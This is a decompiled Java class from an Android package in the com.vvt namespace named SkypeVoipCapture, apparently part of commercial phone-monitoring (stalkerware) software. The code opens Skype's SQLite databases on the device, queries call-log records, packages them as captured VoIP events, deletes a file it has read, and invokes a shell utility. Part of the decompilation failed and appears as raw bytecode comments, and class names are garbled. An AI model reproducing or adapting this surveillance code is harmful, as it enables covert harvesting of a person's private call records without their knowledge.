package com.vvt.al.e;

import android.database.sqlite.SQLiteDatabase;
import android.os.SystemClock;
import java.io.File;

public class c
  extends com.vvt.al.a
  implements com.vvt.al.c
{
  private static final boolean c = com.vvt.ak.a.a;
  private static final boolean d = com.vvt.ak.a.e;
  
  public c(String paramString1, String paramString2, com.vvt.h.d paramd, com.vvt.base.a parama)
  {
    super(paramString1, paramString2, parama);
  }
  
  private com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = c;
    if (bool1) {}
    Object localObject1 = c();
    localObject1 = com.vvt.capture.e.d.a(paramSQLiteDatabase, (String)localObject1, paramString);
    Object localObject2 = ((com.vvt.im.events.info.d)localObject1).g();
    boolean bool2 = com.vvt.ag.b.a((String)localObject2);
    if (!bool2)
    {
      localObject2 = new java/io/File;
      String str = ((com.vvt.im.events.info.d)localObject1).g();
      ((File)localObject2).<init>(str);
      ((File)localObject2).delete();
    }
    bool2 = c;
    if (bool2) {}
    return (com.vvt.im.events.info.d)localObject1;
  }
  
  /* Error */
  private void a(String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 4
    //   3: getstatic 16	com/vvt/al/e/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   6: istore 5
    //   8: iload 5
    //   10: ifeq +3 -> 13
    //   13: aload_2
    //   14: invokestatic 55	com/vvt/capture/e/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)Ljava/lang/String;
    //   17: astore 6
    //   19: aload 6
    //   21: ifnull +389 -> 410
    //   24: bipush 17
    //   26: istore 5
    //   28: iload 5
    //   30: aload_3
    //   31: invokestatic 61	com/vvt/p/MyUncaughtExceptionHandler:a	(ILjava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   34: astore 7
    //   36: aload 7
    //   38: ifnull +180 -> 218
    //   41: invokestatic 65	com/vvt/capture/e/MyUncaughtExceptionHandler/a/removeFromPath:a	()Ljava/lang/String;
    //   44: astore 8
    //   46: iconst_0
    //   47: istore 9
    //   49: aconst_null
    //   50: astore 10
    //   52: aload 7
    //   54: aload 8
    //   56: aconst_null
    //   57: invokevirtual 71	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   60: astore 10
    //   62: aload 10
    //   64: ifnull +145 -> 209
    //   67: iconst_1
    //   68: istore 5
    //   70: aload 7
    //   72: iload 5
    //   74: invokestatic 75	com/vvt/capture/e/MyUncaughtExceptionHandler/a/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;I)Ljava/util/ArrayList;
    //   77: astore 8
    //   79: aload 8
    //   81: invokevirtual 81	java/util/ArrayList:size	()I
    //   84: istore 11
    //   86: iload 11
    //   88: ifle +111 -> 199
    //   91: iconst_0
    //   92: istore 11
    //   94: aload 8
    //   96: iconst_0
    //   97: invokevirtual 85	java/util/ArrayList:get	(I)Ljava/lang/Object;
    //   100: astore 8
    //   102: aload 8
    //   104: checkcast 87	com/vvt/capture/e/a/a
    //   107: astore 8
    //   109: aload_0
    //   110: aload 7
    //   112: aload 6
    //   114: invokespecial 90	com/vvt/al/e/MyUncaughtExceptionHandler:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Lcom/vvt/im/events/info/d;
    //   117: astore 12
    //   119: aload 8
    //   121: astore 4
    //   123: aload 12
    //   125: astore 8
    //   127: aload 10
    //   129: ifnull +10 -> 139
    //   132: aload 10
    //   134: invokeinterface 96 1 0
    //   139: aload 7
    //   141: ifnull +8 -> 149
    //   144: aload 7
    //   146: invokevirtual 97	android/database/sqlite/SQLiteDatabase:close	()V
    //   149: aload 4
    //   151: ifnull +37 -> 188
    //   154: aload 8
    //   156: ifnull +32 -> 188
    //   159: aload_0
    //   160: aload 4
    //   162: invokevirtual 100	com/vvt/al/e/MyUncaughtExceptionHandler:a	(Lcom/vvt/im/events/info/ICallLogData;)Z
    //   165: istore 9
    //   167: iload 9
    //   169: ifeq +175 -> 344
    //   172: getstatic 106	com/vvt/events/FxVoipCategory:SKYPE	Lcom/vvt/events/FxVoipCategory;
    //   175: astore 10
    //   177: aload_0
    //   178: aload_1
    //   179: aload 4
    //   181: aload 8
    //   183: aload 10
    //   185: invokevirtual 109	com/vvt/al/e/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Lcom/vvt/im/events/info/ICallLogData;Lcom/vvt/im/events/info/d;Lcom/vvt/events/FxVoipCategory;)V
    //   188: getstatic 16	com/vvt/al/e/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   191: istore 5
    //   193: iload 5
    //   195: ifeq +3 -> 198
    //   198: return
    //   199: getstatic 21	com/vvt/al/e/MyUncaughtExceptionHandler:d	Z
    //   202: istore 5
    //   204: iload 5
    //   206: ifeq +3 -> 209
    //   209: iconst_0
    //   210: istore 5
    //   212: aconst_null
    //   213: astore 8
    //   215: goto -88 -> 127
    //   218: getstatic 21	com/vvt/al/e/MyUncaughtExceptionHandler:d	Z
    //   221: istore 5
    //   223: iload 5
    //   225: ifeq +3 -> 228
    //   228: iconst_0
    //   229: istore 5
    //   231: aconst_null
    //   232: astore 8
    //   234: iconst_0
    //   235: istore 9
    //   237: aconst_null
    //   238: astore 10
    //   240: goto -113 -> 127
    //   243: astore 8
    //   245: iconst_0
    //   246: istore 5
    //   248: aconst_null
    //   249: astore 8
    //   251: iconst_0
    //   252: istore 9
    //   254: aconst_null
    //   255: astore 10
    //   257: aconst_null
    //   258: astore 7
    //   260: getstatic 21	com/vvt/al/e/MyUncaughtExceptionHandler:d	Z
    //   263: istore 13
    //   265: iload 13
    //   267: ifeq +3 -> 270
    //   270: aload 10
    //   272: ifnull +10 -> 282
    //   275: aload 10
    //   277: invokeinterface 96 1 0
    //   282: aload 7
    //   284: ifnull +8 -> 292
    //   287: aload 7
    //   289: invokevirtual 97	android/database/sqlite/SQLiteDatabase:close	()V
    //   292: aconst_null
    //   293: astore 12
    //   295: aload 8
    //   297: astore 4
    //   299: iconst_0
    //   300: istore 5
    //   302: aconst_null
    //   303: astore 8
    //   305: goto -156 -> 149
    //   308: astore 8
    //   310: iconst_0
    //   311: istore 9
    //   313: aconst_null
    //   314: astore 10
    //   316: aconst_null
    //   317: astore 7
    //   319: aload 10
    //   321: ifnull +10 -> 331
    //   324: aload 10
    //   326: invokeinterface 96 1 0
    //   331: aload 7
    //   333: ifnull +8 -> 341
    //   336: aload 7
    //   338: invokevirtual 97	android/database/sqlite/SQLiteDatabase:close	()V
    //   341: aload 8
    //   343: athrow
    //   344: getstatic 16	com/vvt/al/e/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	Z
    //   347: istore 5
    //   349: iload 5
    //   351: ifeq +3 -> 354
    //   354: aload_1
    //   355: invokestatic 114	com/vvt/shell/ShellUtil:i	(Ljava/lang/String;)V
    //   358: goto -170 -> 188
    //   361: astore 8
    //   363: iconst_0
    //   364: istore 9
    //   366: aconst_null
    //   367: astore 10
    //   369: goto -50 -> 319
    //   372: astore 8
    //   374: goto -55 -> 319
    //   377: astore 8
    //   379: iconst_0
    //   380: istore 5
    //   382: aconst_null
    //   383: astore 8
    //   385: iconst_0
    //   386: istore 9
    //   388: aconst_null
    //   389: astore 10
    //   391: goto -131 -> 260
    //   394: astore 8
    //   396: iconst_0
    //   397: istore 5
    //   399: aconst_null
    //   400: astore 8
    //   402: goto -142 -> 260
    //   405: astore 6
    //   407: goto -147 -> 260
    //   410: aconst_null
    //   411: astore 7
    //   413: goto -377 -> 36
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	416	0	this	MyUncaughtExceptionHandler
    //   0	416	1	paramString1	String
    //   0	416	2	paramString2	String
    //   0	416	3	paramString3	String
    //   1	297	4	localObject1	Object
    //   6	3	5	bool1	boolean
    //   26	47	5	i	int
    //   191	207	5	bool2	boolean
    //   17	96	6	str	String
    //   405	1	6	localException1	Exception
    //   34	378	7	localSQLiteDatabase	SQLiteDatabase
    //   44	189	8	localObject2	Object
    //   243	1	8	localException2	Exception
    //   249	55	8	localObject3	Object
    //   308	34	8	localObject4	Object
    //   361	1	8	localObject5	Object
    //   372	1	8	localObject6	Object
    //   377	1	8	localException3	Exception
    //   383	1	8	localObject7	Object
    //   394	1	8	localException4	Exception
    //   400	1	8	localObject8	Object
    //   47	340	9	bool3	boolean
    //   50	340	10	localObject9	Object
    //   84	9	11	j	int
    //   117	177	12	locald	com.vvt.im.events.info.d
    //   263	3	13	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   13	17	243	java/lang/Exception
    //   30	34	243	java/lang/Exception
    //   13	17	308	finally
    //   30	34	308	finally
    //   41	44	361	finally
    //   56	60	361	finally
    //   218	221	361	finally
    //   72	77	372	finally
    //   79	84	372	finally
    //   96	100	372	finally
    //   102	107	372	finally
    //   112	117	372	finally
    //   199	202	372	finally
    //   260	263	372	finally
    //   41	44	377	java/lang/Exception
    //   56	60	377	java/lang/Exception
    //   218	221	377	java/lang/Exception
    //   72	77	394	java/lang/Exception
    //   79	84	394	java/lang/Exception
    //   96	100	394	java/lang/Exception
    //   102	107	394	java/lang/Exception
    //   199	202	394	java/lang/Exception
    //   112	117	405	java/lang/Exception
  }
  
  private e f()
  {
    String str1 = c();
    String str2 = e();
    String str3 = this.a;
    str3 = com.vvt.capture.e.b.b.d.a(str1, str2, str1, str3);
    e locale = new com/vvt/al/e/e;
    String str4 = null;
    locale.<init>(this, null);
    boolean bool1 = com.vvt.ag.b.a(str3);
    if (!bool1)
    {
      str4 = this.a;
      str3 = com.vvt.capture.e.c.a.a.b.b.a(str1, str3, str2, str4);
      str4 = this.a;
      str1 = com.vvt.capture.e.b.b.d.b(str2, str1, str4);
      boolean bool2 = c;
      if (bool2) {}
      bool2 = true;
      locale.a = bool2;
      locale.c = str3;
      locale.b = str1;
    }
    for (;;)
    {
      return locale;
      str1 = null;
      locale.a = false;
      boolean bool3 = d;
      if (!bool3) {}
    }
  }
  
  public String a()
  {
    return "voip_skype";
  }
  
  public void a(String paramString, long paramLong)
  {
    boolean bool1 = c;
    if (bool1) {}
    bool1 = c;
    if (bool1) {}
    long l = 10000L;
    SystemClock.sleep(l);
    Object localObject = f();
    boolean bool2 = ((e)localObject).a;
    if (bool2)
    {
      String str = ((e)localObject).b;
      localObject = ((e)localObject).c;
      a(paramString, str, (String)localObject);
    }
    d();
    bool1 = c;
    if (bool1) {}
  }
  
  public String b()
  {
    return "SkypeVoipCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/e/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */